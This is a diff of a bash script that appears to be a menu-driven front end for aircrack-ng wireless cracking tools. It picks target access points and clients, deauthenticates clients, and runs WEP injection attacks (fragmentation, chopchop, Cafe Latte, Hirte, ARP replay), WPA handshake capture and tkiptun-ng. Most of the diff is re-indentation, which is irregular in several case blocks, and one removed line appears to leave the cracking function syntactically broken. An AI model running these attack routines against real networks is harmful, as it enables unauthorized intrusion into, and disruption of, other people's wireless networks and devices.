@@ -25,21 +25,21 @@ menu(){
 
 ## This is for SCAN (1) option: ###########################
 choosetype(){
-if [ "$AUTO" == 1 ]; then ENCRYPT="$1"; return; fi # We actually just try to crack wep on autpwn mode. 
+    if [ "$AUTO" == 1 ]; then ENCRYPT="$1"; return; fi # We actually just try to crack wep on autpwn mode. 
 
-while true; do $clear
-  mkmenu "Select encryption" "No filter" "OPN (open)" "WEP" "WPA" "WPA1" "WPA2" "Return to main menu"
-  echo "Option number: "
-  read yn
-  case $yn in
-    1 ) ENCRYPT="" ; choosescan; break ;;
-    2 ) ENCRYPT="OPN" ; choosescan; break ;;
+    while true; do $clear
+        mkmenu "Select encryption" "No filter" "OPN (open)" "WEP" "WPA" "WPA1" "WPA2" "Return to main menu"
+        echo "Option number: "
+        read yn
+        case $yn in
+            1 ) ENCRYPT="" ; choosescan; break ;;
+        2 ) ENCRYPT="OPN" ; choosescan; break ;;
     3 ) ENCRYPT="WEP" ; choosescan; break ;;
-    4 ) ENCRYPT="WPA" ; choosescan; break ;;
+4 ) ENCRYPT="WPA" ; choosescan; break ;;
     5 ) ENCRYPT="WPA1" ; choosescan; break ;;
-    6 ) ENCRYPT="WPA2" ; choosescan; break ;;
+6 ) ENCRYPT="WPA2" ; choosescan; break ;;
     7 ) break;;
-    * ) _ 'Unknown response. Try again' ;;
+* ) _ 'Unknown response. Try again' ;;
 
   esac
 done
@@ -49,380 +49,377 @@ choosescan(){
     if [ "$AUTO" == 1 ]; then Scan; return; fi
 
     while true; do
-      arrow; mkmenu "Channel" "Channel Hoping" "Specific Channel"
-      read yn
-      case $yn in
-        1 ) Scan;break;;
+        arrow; mkmenu "Channel" "Channel Hoping" "Specific Channel"
+        read yn
+        case $yn in
+            1 ) Scan;break;;
         2 ) Scanchan;break;;
-        * ) _ "Unknown response. Try again" ;;
-      esac
+    * ) _ "Unknown response. Try again" ;;
+esac
     done
 }
-	#Subproducts of choosescan.
-    Scan(){
-        export SCAN=1
-		$clear; rm -rf $DUMP_PATH/dump*
-        execute "Scanning for targets" $AIRODUMP -w $DUMP_PATH/dump --encrypt $ENCRYPT -a $wifi
-        export SCAN=0
-	}
+#Subproducts of choosescan.
+Scan(){
+    export SCAN=1
+    $clear; rm -rf $DUMP_PATH/dump*
+    execute "Scanning for targets" $AIRODUMP -w $DUMP_PATH/dump --encrypt $ENCRYPT -a $wifi
+    export SCAN=0
+}
 
-    Scanchan(){
-      export SCAN=1
-      arrow; echo -e "\n `gettext '
-      +------------Channel Input----------+
-      |       Please input channel        |
-      |                                   |
-      |          You can insert:          |
-      |   A single number   6             |
-      |   A range           1-5           |
-      |   Multiple channels 1,1,2,5-7,11  |
-      +-----------------------------------+
-   '`"
-		read channel_number; set -- ${channel_number}
-	    $clear; rm -rf $DUMP_PATH/dump*; monmode $wifi $channel_number
-		execute "Scanning for targets on channel $channel_number" $AIRODUMP -w $DUMP_PATH/dump --channel $channel_number --encrypt $ENCRYPT -a $wifi
-        export SCAN=0
-	}
+Scanchan(){
+    export SCAN=1
+    arrow; echo -e "\n `gettext '
+    +------------Channel Input----------+
+    |       Please input channel        |
+    |                                   |
+    |          You can insert:          |
+    |   A single number   6             |
+    |   A range           1-5           |
+    |   Multiple channels 1,1,2,5-7,11  |
+    +-----------------------------------+
+    '`"
+    read channel_number; set -- ${channel_number}
+    $clear; rm -rf $DUMP_PATH/dump*; monmode $wifi $channel_number
+    execute "Scanning for targets on channel $channel_number" $AIRODUMP -w $DUMP_PATH/dump --channel $channel_number --encrypt $ENCRYPT -a $wifi
+    export SCAN=0
+}
 
 # This is for SELECT (2) option
 Parseforap(){
-	i=0; ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
-	head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv ; $clear
+    i=0; ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
+    head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv ; $clear
 
     if [ "$AUTO" != 1 ]; then
-    	_ "\tDetected Access point list" "\n"
-    	_ "#\t\tMAC\t\tCHAN\tSECU\tPOWER\t#CHAR\t\tSSID" "\n"
+        _ "\tDetected Access point list" "\n"
+        _ "#\t\tMAC\t\tCHAN\tSECU\tPOWER\t#CHAR\t\tSSID" "\n"
     fi
-	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
-	 longueur=${#MAC}
-	   if [ $longueur -ge 17 ]; then
-	    i=$(($i+1))
-        if [ "$AUTO" != 1  ]; then
-    	    echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
+    while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
+        longueur=${#MAC}
+        if [ $longueur -ge 17 ]; then
+            i=$(($i+1))
+            if [ "$AUTO" != 1  ]; then
+                echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
+            fi
+            aidlenght=$IDLENGTH
+            assid[$i]=$ESSID; achannel[$i]=$CHANNEL; 
+            amac[$i]=$MAC; aprivacy[$i]=$PRIVACY;
+            aspeed[$i]=$SPEED
         fi
-	    aidlenght=$IDLENGTH
-	    assid[$i]=$ESSID; achannel[$i]=$CHANNEL; 
-        amac[$i]=$MAC; aprivacy[$i]=$PRIVACY;
-	    aspeed[$i]=$SPEED
-	   fi
-	done < $DUMP_PATH/dump-02.csv
+    done < $DUMP_PATH/dump-02.csv
 
 
     if [ "$AUTO" == 1 ]; then
         CURRENT=$(( $CURRENT + 1 ))
         choice=$CURRENT
     else
-	_ 'Select target: '
-	    read choice
+        _ 'Select target: '
+        read choice
     fi
 
-	idlenght=${aidlenght[$choice]}
-	ssid=${assid[$choice]}
-	channel=${achannel[$choice]}
-	mac=${amac[$choice]}
-	privacy=${aprivacy[$choice]}
-	speed=${aspeed[$choice]}
-	Host_IDL=$idlength
-	Host_SPEED=$speed
-	Host_ENC=$privacy
-	Host_MAC=$mac
-	Host_CHAN=$channel
-	acouper=${#ssid}
-	fin=$(($acouper-idlength))
-	Host_SSID=${ssid:1:fin}
+    idlenght=${aidlenght[$choice]}
+    ssid=${assid[$choice]}
+    channel=${achannel[$choice]}
+    mac=${amac[$choice]}
+    privacy=${aprivacy[$choice]}
+    speed=${aspeed[$choice]}
+    Host_IDL=$idlength
+    Host_SPEED=$speed
+    Host_ENC=$privacy
+    Host_MAC=$mac
+    Host_CHAN=$channel
+    acouper=${#ssid}
+    fin=$(($acouper-idlength))
+    Host_SSID=${ssid:1:fin}
     echo "Target network is $Host_SSID $Host_MAC"
     sleep 2
 }
 
 choosetarget(){
-if [ "$AUTO" == 1 ]; then return; fi
-while true; do
-  mkmenu "Client Selection" "Select associated clients" "No select clients" "Try to detect clients" "Show me the clients" "Correct the SSID"
-  read yn
-  case $yn in
-    1 ) listsel2  ; break ;;
-    2 ) break ;;
+    if [ "$AUTO" == 1 ]; then return; fi
+    while true; do
+        mkmenu "Client Selection" "Select associated clients" "No select clients" "Try to detect clients" "Show me the clients" "Correct the SSID"
+        read yn
+        case $yn in
+            1 ) listsel2  ; break ;;
+        2 ) break ;;
     3 ) clientdetect && clientfound ; break ;;
-    4 ) askclientsel ; break ;;
+4 ) askclientsel ; break ;;
     5 ) Host_ssidinput && choosetarget ; break ;; #Host_ssidinput is called from many places, not putting it here.
-    * ) echo -e "`gettext \"Unknown response. Try again\"`"; sleep 1; $clear ;;
+* ) echo -e "`gettext \"Unknown response. Try again\"`"; sleep 1; $clear ;;
   esac
 done
 }
- # Those are subproducts of choosetarget.
-	# List clients, (Option 1)
-    listsel2(){
+# Those are subproducts of choosetarget.
+# List clients, (Option 1)
+listsel2(){
+    if [ "$AUTO" == "1" ]; then return; fi
+    HOST=`cat $DUMP_PATH/dump-01.csv | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
+    arrow; mkbox "Client Selection" "Select client now" "These clients are connected to" $Host_SSID
+    select CLIENT in $HOST;	do export Client_MAC=` echo $CLIENT | awk '{ split($1, info, "," ) print info[1]  }' `;break;done
+}
+
+# This way we detect clients. (Option 3)
+clientdetect(){
+    if [ "$AUTO" == "1" ]; then return; fi
+    $iwconfig $wificard channel $Host_CHAN
+    capture & deauthall & menufonction # Those functions are used from many others, so I dont let them here, they'll be independent.
+}
+
+clientfound(){
+    if [ "$AUTO" == "1" ]; then return; fi
+    while true; do
+        arrow; mkmenu "Client Selection" "I found some client" "No clients showed up"
+        read yn
+        case $yn in
+            1 ) listsel3 ; break ;;
+        2 ) break ;;
+    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
+esac
+        done
+    }
+    listsel3(){
         if [ "$AUTO" == "1" ]; then return; fi
-	    HOST=`cat $DUMP_PATH/dump-01.csv | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC`
+        HOST=`cat $DUMP_PATH/$Host_MAC-01.csv | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC|sed 's/,//'`
         arrow; mkbox "Client Selection" "Select client now" "These clients are connected to" $Host_SSID
-        select CLIENT in $HOST;	do export Client_MAC=` echo $CLIENT | awk '{ split($1, info, "," ) print info[1]  }' `;break;done
-	}
+        select CLIENT in $HOST; do
+            export Client_MAC=` echo $CLIENT | awk '{
+            split($1, info, "," )
+            print info[1]  }' `	
+            break;
+        done
+    }
 
-	# This way we detect clients. (Option 3)
-    clientdetect(){
-        if [ "$AUTO" == "1" ]; then return; fi
-		$iwconfig $wificard channel $Host_CHAN
-		capture & deauthall & menufonction # Those functions are used from many others, so I dont let them here, they'll be independent.
-	}
-
-    clientfound(){
-        if [ "$AUTO" == "1" ]; then return; fi
-		while true; do
-          arrow; mkmenu "Client Selection" "I found some client" "No clients showed up"
-		  read yn
-		  case $yn in
-	        1 ) listsel3 ; break ;;
-		    2 ) break ;;
-		    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
-		  esac
-		done
-		}
-        listsel3(){
-            if [ "$AUTO" == "1" ]; then return; fi
-			HOST=`cat $DUMP_PATH/$Host_MAC-01.csv | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -a -v $Host_MAC|sed 's/,//'`
-                arrow; mkbox "Client Selection" "Select client now" "These clients are connected to" $Host_SSID
-				select CLIENT in $HOST; do
-					export Client_MAC=` echo $CLIENT | awk '{
-						split($1, info, "," )
-						print info[1]  }' `	
-					break;
-				done
-		}
-
-	# Show clientes (Option 4)
+    # Show clientes (Option 4)
     askclientsel(){
         if [ "$AUTO" == "1" ]; then return; fi
-		while true; do
-		  $clear; mkmenu "Client Selection" "Detected clients" "Manual Input" "Associated Client List"
-		  read yn
-		  echo ""
-		  case $yn in
-		    1 ) asklistsel ; break ;;
-		    2 ) clientinput ; break ;;
-		    3 ) listsel2 ; break ;;
-		    * ) echo -e "`gettext 'Unknown response. Try again'`" ;;
-		  esac
-	done
-	}
+        while true; do
+            $clear; mkmenu "Client Selection" "Detected clients" "Manual Input" "Associated Client List"
+            read yn
+            echo ""
+            case $yn in
+                1 ) asklistsel ; break ;;
+            2 ) clientinput ; break ;;
+        3 ) listsel2 ; break ;;
+    * ) echo -e "`gettext 'Unknown response. Try again'`" ;;
+esac
+    done
+}
 
-    asklistsel(){
-            if [ "$AUTO" == "1" ]; then return; fi
-			while true; do
-				$clear; arrow; mkmenu "Client Selection" "Clients of $Host_SSID" "Full list (all macs)"
-				if [ "$Host_SSID" = $'\r' ]; then Host_SSID="`gettext \"No SSID has been detected!\"`"; fi
-				read yn
-				case $yn in
-					1 ) listsel2 ; break ;;
-					2 ) listsel1 ; break ;;
-					* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
-				esac
-			done
-		}
+asklistsel(){
+    if [ "$AUTO" == "1" ]; then return; fi
+    while true; do
+        $clear; arrow; mkmenu "Client Selection" "Clients of $Host_SSID" "Full list (all macs)"
+        if [ "$Host_SSID" = $'\r' ]; then Host_SSID="`gettext \"No SSID has been detected!\"`"; fi
+        read yn
+        case $yn in
+            1 ) listsel2 ; break ;;
+        2 ) listsel1 ; break ;;
+    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
+esac
+            done
+        }
 
         listsel1(){
-                if [ "$AUTO" == "1" ]; then return; fi
-				HOST=`cat $DUMP_PATH/dump-01.csv | grep -a "0.:..:..:..:.." | awk '{ print $1 }'| grep -a -v 00:00:00:00`
-				arrow; mkbox "Client selection" "Select client now"
-				select CLIENT in $HOST;
-				do
-					export Client_MAC=` echo $CLIENT | awk '{
-						split($1, info, "," )
-						print info[1]  }' `	
-					break;
-				done
-			}
+            if [ "$AUTO" == "1" ]; then return; fi
+            HOST=`cat $DUMP_PATH/dump-01.csv | grep -a "0.:..:..:..:.." | awk '{ print $1 }'| grep -a -v 00:00:00:00`
+            arrow; mkbox "Client selection" "Select client now"
+            select CLIENT in $HOST;
+            do
+                export Client_MAC=` echo $CLIENT | awk '{
+                split($1, info, "," )
+                print info[1]  }' `	
+                break;
+            done
+        }
 
         clientinput(){
             if [ "$AUTO" == "1" ]; then return; fi
-			arrow; mkbox "Client selection" "Type in client mac now"
-			read Client_MAC; set -- ${Client_MAC}
-		}
+            arrow; mkbox "Client selection" "Type in client mac now"
+            read Client_MAC; set -- ${Client_MAC}
+        }
 
-# This is for ATTACK (3) option
-witchattack(){ monmode
-    if [[ "$Host_ENC" =~ (.*)"WEP"(.*) ]]; then attackwep
-    elif [[ "$Host_ENC" =~ (.*)"WPA"(.*) ]]; then attackwpa
-    else attackopn; fi
+        # This is for ATTACK (3) option
+        witchattack(){ monmode
+            if [[ "$Host_ENC" =~ (.*)"WEP"(.*) ]]; then attackwep
+            elif [[ "$Host_ENC" =~ (.*)"WPA"(.*) ]]; then attackwpa
+            else attackopn; fi
+        }
+
+        # If wep
+        attackwep(){
+            while true; do $clear  
+                mkmenu "Wep Attacks" "-   Attacks not using a client" "Fake auth => Automatic  " "Fake auth => Interactive" "Fragmentation attack " "Chopchop attack " "Cafe Latte attack " "Hirte attack " "separator"	"- Attacks using a client "	"ARP replay => Automatic"	"ARP replay => Interactive"	"Fragmentation attack "	"Frag. attack on client "	"Chopchop attack"	"separator"	"-  Injection if xor file generated "	"ARP inject from xor (PSK) " "Return to main menu "
+
+                read -p "Enter attack:" yn
+                echo ""
+                case $yn in
+                    1  ) fakeautoattack ; break ;;
+                2  ) fakeinteractiveattack;$clear ; break ;;
+            3  ) fragnoclient ;$clear; break ;;
+        4  ) chopchopattack ;$clear; break ;;
+    5  ) cafelatteattack ;$clear; break ;;
+6  ) hirteattack ;$clear; break ;;
+        7  ) attackclient ;$clear; break ;;
+    8  ) interactiveattack ;$clear; break ;;
+9  ) fragmentationattack -5 ;$clear; break ;;
+        10 ) fragmentationattack -7 ;$clear ; break ;;  
+    11 ) chopchopattackclient;$clear ; break ;;
+12 ) pskarp ;$clear; break ;;
+        13 ) $clear;break ;;
+    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
+esac
+    done
+}
+# Subproducts of attackwep function:
+#Option 1 (fake auth auto)
+fakeautoattack(){
+    if [ "$INTERACTIVE" == 1 ]; then
+        read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
+        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
+
+        read -p "`gettext \"Enable From or To destination bit (f/t):  \"`" FT
+        if [ "$FT" = "" ]; then FT="f"; fi
+
+    else
+        INJMAC="FF:FF:FF:FF:FF:FF"
+        FT="f"
+    fi
+
+    capture & execute "Injection: Host: $Host_MAC" $AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86 -h $FAKE_MAC -x $INJECTRATE & choosefake
+
+}
+#Option 2 (fake auth interactive)
+fakeinteractiveattack(){
+    if [ "$INTERACTIVE" == "1" ]; then
+        read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
+        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
+        read -p "`gettext \"Set framecontrol word (hex): (0841) \"`" FT
+        if [ "$FT" = "" ]; then FT="0841"; fi
+    else
+        INJMAC="FF:FF:FF:FF:FF:FF"
+        FT="0841"
+    fi
+    capture & execute  "Interactive Packet Sel on Host: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE & choosefake
 }
 
-	# If wep
-    attackwep(){
-    while true; do $clear  
-        mkmenu "Wep Attacks" "-   Attacks not using a client" "Fake auth => Automatic  " "Fake auth => Interactive" "Fragmentation attack " "Chopchop attack " "Cafe Latte attack " "Hirte attack " "separator"	"- Attacks using a client "	"ARP replay => Automatic"	"ARP replay => Interactive"	"Fragmentation attack "	"Frag. attack on client "	"Chopchop attack"	"separator"	"-  Injection if xor file generated "	"ARP inject from xor (PSK) " "Return to main menu "
+#Option 3 (fragmentation attack)
+fragnoclient(){
+    rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
+    killall -9 airodump-ng aireplay-ng 
+    execute "Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture & choosefake &  injectmenu
+}
 
-	  read -p "Enter attack:" yn
-	  echo ""
-	  case $yn in
-	    1  ) fakeautoattack ; break ;;
-	    2  ) fakeinteractiveattack;$clear ; break ;;
-	    3  ) fragnoclient ;$clear; break ;;
-	    4  ) chopchopattack ;$clear; break ;;
-	    5  ) cafelatteattack ;$clear; break ;;
-	    6  ) hirteattack ;$clear; break ;;
-	    7  ) attackclient ;$clear; break ;;
-	    8  ) interactiveattack ;$clear; break ;;
-	    9  ) fragmentationattack -5 ;$clear; break ;;
-	    10 ) fragmentationattack -7 ;$clear ; break ;;  
-	    11 ) chopchopattackclient;$clear ; break ;;
-	    12 ) pskarp ;$clear; break ;;
-	    13 ) $clear;break ;;
-	    * ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
-	  esac
-	done
-	}
-		# Subproducts of attackwep function:
-		#Option 1 (fake auth auto)
-        fakeautoattack(){
-			if [ "$INTERACTIVE" == 1 ]; then
-				read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
-					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
+#Option 4 (chopchopattack)
+chopchopattack(){
+    $clear && hardclean  replay_dec-*.xor
+    capture &  fakeauth3 & 
+    execute "Chopchoping: $Host_MAC" $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi & injectmenu
+}
 
-				read -p "`gettext \"Enable From or To destination bit (f/t):  \"`" FT
-					if [ "$FT" = "" ]; then FT="f"; fi
+#Option 5 (caffe late attack)
+cafelatteattack(){
+    capture & execute  "Cafe Latte Attack on: $Host_SSID " $AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $iwifi & fakeauth3 & menufonction
+}
 
-			else
-				INJMAC="FF:FF:FF:FF:FF:FF"
-				FT="f"
-			fi
+#Option 6 (hirte attack)
+hirteattack(){
+    capture & execute "Hirte Attack on: $Host_SSID" $AIREPLAY -7 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $iwifi & fakeauth3 & menufonction
+}
 
-			capture & execute "Injection: Host: $Host_MAC" $AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86 -h $FAKE_MAC -x $INJECTRATE & choosefake
+#Option 7 (Auto arp replay)
+attackclient(){
+    if [ "$INTERACTIVE" == "1" ]; then
+        read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
+        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
+        read -p "`gettext 'Enable From or To destination bit (f/t):  '`" FT
+        if [ "$FT" = "" ]; then FT="f"; fi
+    else INJMAC="FF:FF:FF:FF:FF:FF"; FT="f"; fi
+    capture & execute "Injection in Host: $Host_MAC Client $Client_MAC" $AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE & menufonction
+}
 
-		}
-		#Option 2 (fake auth interactive)
-        fakeinteractiveattack(){
-			if [ "$INTERACTIVE" == "1" ]; then
-				read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
-					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
-				read -p "`gettext \"Set framecontrol word (hex): (0841) \"`" FT
-					if [ "$FT" = "" ]; then FT="0841"; fi
-			else
-				INJMAC="FF:FF:FF:FF:FF:FF"
-				FT="0841"
-			fi
-			capture & execute  "Interactive Packet Sel on Host: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE & choosefake
-		}
+#Option 8 (interactive arp replay)
+interactiveattack(){
+    if [ "$INTERACTIVE" == 1 ]; then
+        read -p "`gettext 'Enter destination mac: (FF:FF:FF:FF:FF:FF)'`" INJMAC
+        if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
+        read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT
+        if [ "$FT" = "" ]; then FT="0841"; fi
+    else INJMAC="FF:FF:FF:FF:FF:FF"; FT="0841"; fi
+    capture & execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE & menufonction
+}
 
-		#Option 3 (fragmentation attack)
-        fragnoclient(){
-			rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
-			killall -9 airodump-ng aireplay-ng 
-            execute "Fragmentation w/o client" $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture & choosefake &  injectmenu
-			}
+#Option 9 (fragmentation attack)
+fragmentationattack(){
+    rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
+    killall -9 airodump-ng aireplay-ng
+    execute "Fragmentation attack" $AIREPLAY $1 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture &  injectmenu
+}
+#Option 11
+chopchopattackclient(){
+    $clear && hardclean  replay_dec-*.xor
+    capture & execute "ChopChoping: $Host_SSID" $AIREPLAY --chopchop -h $Client_MAC $iwifi & injectmenu
+}
+#Option 12 (pskarp)
+pskarp(){
+    rm -rf $DUMP_PATH/arp_*.cap
+    $ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
+    execute "PSK ARP Replaying" $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $iwifi & menufonction
+}
+# End of subproducts.
 
-		#Option 4 (chopchopattack)
-        chopchopattack(){
-			$clear && hardclean  replay_dec-*.xor
-			capture &  fakeauth3 & 
-            execute "Chopchoping: $Host_MAC" $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $iwifi & injectmenu
-		}
+# If wpa
+wpahandshake(){
+    $clear && hardclean 
+    execute "Capturing data on channel: $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $wifi & menufonction
+}
 
-		#Option 5 (caffe late attack)
-        cafelatteattack(){
-			capture & execute  "Cafe Latte Attack on: $Host_SSID " $AIREPLAY -6 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $iwifi & fakeauth3 & menufonction
-			}
+attackopn(){ # If no encryption detected
+    if [ "$Host_SSID" = "" ]; then
+        $clear &&  echo  "`gettext 'ERROR: You have to select a target'`"
+    else
+        $clear && echo `gettext "ERROR: Network not encrypted or no network selected "`
+    fi
+}
 
-		#Option 6 (hirte attack)
-        hirteattack(){
-			capture & execute "Hirte Attack on: $Host_SSID" $AIREPLAY -7 -b $Host_MAC -h $FAKE_MAC -x $INJECTRATE -D $iwifi & fakeauth3 & menufonction
-		}
 
-		#Option 7 (Auto arp replay)
-        attackclient(){
-			if [ "$INTERACTIVE" == "1" ]; then
-				read -p "`gettext \"Enter destination mac: (FF:FF:FF:FF:FF:FF)\"`" INJMAC
-					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
-				read -p "`gettext 'Enable From or To destination bit (f/t):  '`" FT
-					if [ "$FT" = "" ]; then FT="f"; fi
-			else INJMAC="FF:FF:FF:FF:FF:FF"; FT="f"; fi
-			capture & execute "Injection in Host: $Host_MAC Client $Client_MAC" $AIREPLAY $iwifi --arpreplay -b $Host_MAC -d $INJMAC -$FT 1 -m 68 -n 86  -h $Client_MAC -x $INJECTRATE & menufonction
-		}
+attackwpa(){
+    while true; do
+        $clear; mkmenu "Select WPA Attack" "Standard attack" "Standard attack with QoS (WMM)"
+        read n
+        case $n in
+            1) wpahandshake; $clear; break;;
+        2) tkiptunstdqos; $clear; break;;
+    esac
+done
+    }
 
-		#Option 8 (interactive arp replay)
-        interactiveattack(){
-			if [ "$INTERACTIVE" == 1 ]; then
-				read -p "`gettext 'Enter destination mac: (FF:FF:FF:FF:FF:FF)'`" INJMAC
-					if [ "$INJMAC" = "" ]; then INJMAC="FF:FF:FF:FF:FF:FF"; fi
-				read -p "`gettext 'Set framecontrol word (hex): (0841) '`" FT
-					if [ "$FT" = "" ]; then FT="0841"; fi
-			else INJMAC="FF:FF:FF:FF:FF:FF"; FT="0841"; fi
-			capture & execute "Interactive Packet Sel on: $Host_SSID" $AIREPLAY $iwifi --interactive -p $FT -c $INJMAC -b $Host_MAC $Client_MAC -x $INJECTRATE & menufonction
-		}
-
-		#Option 9 (fragmentation attack)
-        fragmentationattack(){
-			rm -rf fragment-*.xor $DUMP_PATH/frag_*.cap $DUMP_PATH/$Host_MAC*
-			killall -9 airodump-ng aireplay-ng
-            execute "Fragmentation attack" $AIREPLAY $1 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $iwifi & capture &  injectmenu
-		}
-		#Option 11
-        chopchopattackclient(){
-			$clear && hardclean  replay_dec-*.xor
-			capture & execute "ChopChoping: $Host_SSID" $AIREPLAY --chopchop -h $Client_MAC $iwifi & injectmenu
-		}
-		#Option 12 (pskarp)
-        pskarp(){
-			rm -rf $DUMP_PATH/arp_*.cap
-			$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
-            execute "PSK ARP Replaying" $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $iwifi & menufonction
-		}
-		# End of subproducts.
-
-	# If wpa
+    # 1 just capture
     wpahandshake(){
-		$clear && hardclean 
-		execute "Capturing data on channel: $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $wifi & menufonction
-	}
+        $clear && hardclean
+        execute "Capturing data on channel: $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $wifi & menufonction
+    }
 
-    attackopn(){ # If no encryption detected
-	  if [ "$Host_SSID" = "" ]; then
-		 $clear &&  echo  "`gettext 'ERROR: You have to select a target'`"
-	  else
-		$clear && echo `gettext "ERROR: Network not encrypted or no network selected "`
-	  fi
-	}
-
-
-    attackwpa(){
-        while true; do
-            $clear; mkmenu "Select WPA Attack" "Standard attack" "Standard attack with QoS (WMM)"
-            read n
-        	case $n in
-        		1) wpahandshake; $clear; break;;
-        		2) tkiptunstdqos; $clear; break;;
-        	esac
-        done
-	}
-
-	# 1 just capture
-    wpahandshake(){
-		$clear && hardclean
-		execute "Capturing data on channel: $Host_CHAN"  $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $wifi & menufonction
-	}
-
-	# 2 Use tkiptun-ng
+    # 2 Use tkiptun-ng
     tkiptunstdqos(){
-		$clear && hardclean 
-		ifconfig $wificard channel $Host_CHAN # Hope this is ok for all cards
-		execute "Executing tkiptun-ng for ap $Host_MAC"  $TKIPTUN -h $FAKE_MAC -a $Host_MAC -m $TKIPTUN_MIN_PL -n $TKIPTUN_MAX_PL  $wifi & menufonction
-	}
+        $clear && hardclean 
+        ifconfig $wificard channel $Host_CHAN # Hope this is ok for all cards
+        execute "Executing tkiptun-ng for ap $Host_MAC"  $TKIPTUN -h $FAKE_MAC -a $Host_MAC -m $TKIPTUN_MIN_PL -n $TKIPTUN_MAX_PL  $wifi & menufonction
+    }
 
-   
-# This is for CRACK (4)  option
+
+    # This is for CRACK (4)  option
 witchcrack(){
-	if [ "$dict" = "1" ]; then
 			while true; do
                 arrow; mkmenu "WEP/WPA Cracking Options" "Autocrack" "Wlandecrypter" "Jazzteldecripter" "Standard aircrack-ng" "Return to menu" &&  read yn
 				case $yn in
-					1 ) auto ; break ;;
-					2 ) wld ; break ;;
